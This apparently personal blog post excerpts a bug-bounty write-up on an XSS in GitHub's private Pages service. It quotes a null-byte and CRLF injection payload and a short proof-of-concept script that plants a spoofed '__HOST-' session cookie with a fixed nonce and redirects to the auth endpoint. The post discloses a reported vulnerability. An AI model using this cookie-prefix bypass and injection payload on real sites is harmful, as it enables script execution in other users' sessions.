---
layout: post
title:  "Nice write up - hacking Github pages for $35K (XSS, HOST, COOKIES)"
date:   2021-04-06
categories: code hacking programming security cool
video: false
---

It turns out, appending a null byte causes the integer parsing to end. In other words, we could use a payload such as.

`"?page_id=" + encodeURIComponent("\r\n\r\n\x00<script>alert(origin)</script>")`

We have an easy nonce bypass if we can somehow bypass the `__Host-` prefix protections.  Simply set a fake nonce in a sibling page which will be passed down.

```
<script>
const id = location.search.substring("?id=".length)

document.cookie = "__HOST-gh_pages_session=dea8c624-468f-4c5b-a4e6-9a32fe6b9b15; domain=.private-org.github.io";
location = "https://github.com/pages/auth?nonce=dea8c624-468f-4c5b-a4e6-9a32fe6b9b15&page_id=" + id + "%0d%0a%0d%0a%00<script>alert(origin)%3c%2fscript>&path=Lw";
</script>

```

It turns out, the GitHub private pages server ignores capitalization when parsing cookies. We have our prefix bypass! From here, we can throw together this simple POC for a full XSS!

In order to get the $15000 bonus... luckily, we can abuse another seemingly irrelevant misconfiguration. Enter “public-private pages”.

[Link](https://robertchen.cc/blog/2021/04/03/github-pages-xss)


